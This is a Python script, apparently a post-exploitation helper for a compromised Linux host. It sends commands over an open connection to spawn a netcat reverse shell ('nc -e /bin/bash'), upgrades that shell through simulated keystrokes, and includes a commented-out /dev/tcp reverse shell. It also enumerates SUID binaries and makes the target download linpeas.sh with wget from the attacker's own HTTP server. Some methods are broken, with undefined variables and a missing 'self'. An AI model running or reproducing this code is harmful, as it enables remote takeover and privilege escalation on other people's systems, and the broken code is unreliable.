#!/usr/bin/env python3
import signal
import os
import random
import time
import socket
import pynput
import subprocess
from pynput.keyboard import Key, Controller

class Rhost:

    def shell(conn):
        bufferSize = 2**12
        command = "which nc"
        conn.send(command.encode())
        recv = conn.recv(bufferSize).decode()
        if recv != '':
            port = random.randint(1000,10000)
            name = socket.gethostname()
            ip = socket.gethostbyname(name)
            subprocess.call(["terminator","-x","nc -lnvp %s"%(port)])
            time.sleep(1)
            cmd = "nc -e /bin/bash %s %s &"%(ip,port)
            conn.send(cmd.encode())
            keyboard = Controller()
            string = """python3 -c 'import pty;pty.spawn("/bin/bash")'"""
            for s in string:
                keyboard.press(s)
                keyboard.release(s)
            keyboard.press(Key.enter)
            keyboard.release(Key.enter)
        else:
            print('toto')
            #cmd = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1 &"

    def listSuid(conn):
        recv = recv.split(' ')
        param = ''.join(recv[1:])
        out = subprocess.getoutput("find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 6 -exec ls -ld {} \; 2>/dev/null")
        s.send(param.encode())


    def linpeas(conn):
        bufferSize = 2**12
        l = ["wget","nc"]
        for cmd in l:
            command = "which " + cmd
            conn.send(command.encode())
            recv = conn.recv(bufferSize).decode()
            if recv == '':
                print(f" {cmd} : NOT AVAILABLE")
            else:
                print(' %s: %s POTIENTIAL UPLOAD\n'%(cmd.replace("\n",""),recv.replace("\n","")))
                if "wget" in cmd:
                    self.wgetLinpeas(conn)
                    break
                elif "nc" in cmd:
                    self.ncLinpeas(conn)
                    break


    def wgetLinpeas(self,conn):
        bufferSize = 2**12
        os.chdir('/opt/peass/')
        CMD = subprocess.Popen("python3 -m http.server", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        pid = CMD.pid + 1
        time.sleep(2)
        name = socket.gethostname()
        ip = socket.gethostbyname(name)
        command = "wget http://%s:8000/linpeas.sh -O /dev/shm/linpeas.sh"%(ip)
        conn.send(command.encode())
        while True:
            response = conn.recv(bufferSize).decode()
            print(response)
            if len(response) < bufferSize:
                os.kill(pid, signal.SIGTERM)
                break
